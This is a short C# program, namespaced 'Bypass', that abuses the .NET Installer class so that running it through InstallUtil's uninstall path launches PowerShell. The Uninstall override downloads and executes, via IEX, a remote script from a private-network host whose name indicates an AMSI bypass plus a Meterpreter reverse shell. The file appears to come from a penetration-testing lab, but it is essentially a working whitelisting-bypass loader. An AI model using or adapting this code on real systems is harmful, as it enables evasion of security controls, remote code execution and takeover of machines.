using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;
using System.Collections;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            //
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(IDictionary savedState)
        {
            String psstr = @"
                IEX ((New-Object Net.WebClient).DownloadString('http://192.168.49.84/bypass_amsi_and_rev_met32.txt'))
                ";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(psstr);
            ps.Invoke();
            rs.Close();
        }
    }
}